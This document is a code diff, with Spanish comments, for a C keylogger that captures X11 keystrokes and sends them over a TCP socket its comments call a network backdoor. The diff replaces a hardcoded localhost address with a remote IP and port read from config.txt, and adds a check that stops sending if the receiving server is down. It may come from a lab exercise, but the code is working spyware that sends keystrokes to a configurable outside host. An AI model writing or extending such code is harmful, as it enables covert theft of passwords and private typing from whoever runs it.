@@ -6,8 +6,7 @@
 #include <unistd.h>
 #include <arpa/inet.h> // LIBRERÍAS DE RED AÑADIDAS
 #include <signal.h>
-
-#define PORT 8080
+#include <sys/socket.h> //para ver la conexion de los pipes
 
 int main(int argc, char *argv[]) {
     
@@ -15,6 +14,24 @@ int main(int argc, char *argv[]) {
     if (argc > 1) {
         id_proceso = argv[1]; 
     }
+
+    // para leer el archivo y encontrar la ip
+    FILE *archivo = fopen("config.txt", "r");
+    if (archivo == NULL) {
+        printf("[-] proceso%s: Error. No se encontró el archivo config.txt\n", id_proceso);
+        return -1;
+    }
+    
+    char puerto_str[20], ip_str[50];
+    fgets(puerto_str, sizeof(puerto_str), archivo); // Lee primera línea (puerto)
+    fgets(ip_str, sizeof(ip_str), archivo);         // Lee segunda línea (IP)
+    fclose(archivo);
+    
+    // Limpiamos los saltos de línea (\n) invisibles que se leen del archivo de texto
+    puerto_str[strcspn(puerto_str, "\n")] = 0;
+    ip_str[strcspn(ip_str, "\n")] = 0;
+    
+    int puerto_config = atoi(puerto_str);
 
     // --- 1. CONFIGURACIÓN DEL SOCKET (BACKDOOR DE RED) ---
     int sock = 0;
@@ -26,11 +43,11 @@ int main(int argc, char *argv[]) {
     }
 
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(PORT);
+    serv_addr.sin_port = htons(puerto_config);
 
     // Convertir la IP a binario (127.0.0.1 es tu propia máquina simulando el servidor remoto)
-    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
-        printf("[-] proceso%s: Dirección inválida\n", id_proceso);
+    if (inet_pton(AF_INET, ip_str, &serv_addr.sin_addr) <= 0) {
+        printf("[-] proceso%s-%s: Dirección inválida\n", id_proceso, ip_str);
         return -1;
     }
 
@@ -80,6 +97,16 @@ int main(int argc, char *argv[]) {
             char *name = XKeysymToString(keysym);
             
             if (name) {
+		// ---> NUEVA DEFENSA ABSOLUTA: EL RADAR TCP <---
+                char radar_buffer[1];
+                // Espiamos el socket sin bloquear el programa
+                int estado_radar = recv(sock, radar_buffer, 1, MSG_DONTWAIT | MSG_PEEK);
+                
+                // Si recv devuelve 0, el servidor del otro lado se apagó/murió
+                if (estado_radar == 0) {
+                    printf("[-] proceso%s: [Radar] El Data Center se cayó. Abortando envío...\n", id_proceso);
+                    break; // Salimos ANTES de que el send() cause un problema
+                } //muere la defensa
                 // --- EL BACKDOOR EN ACCIÓN ---
                 // Formateamos el mensaje (Ej: "P1: a")
                 char mensaje[50];
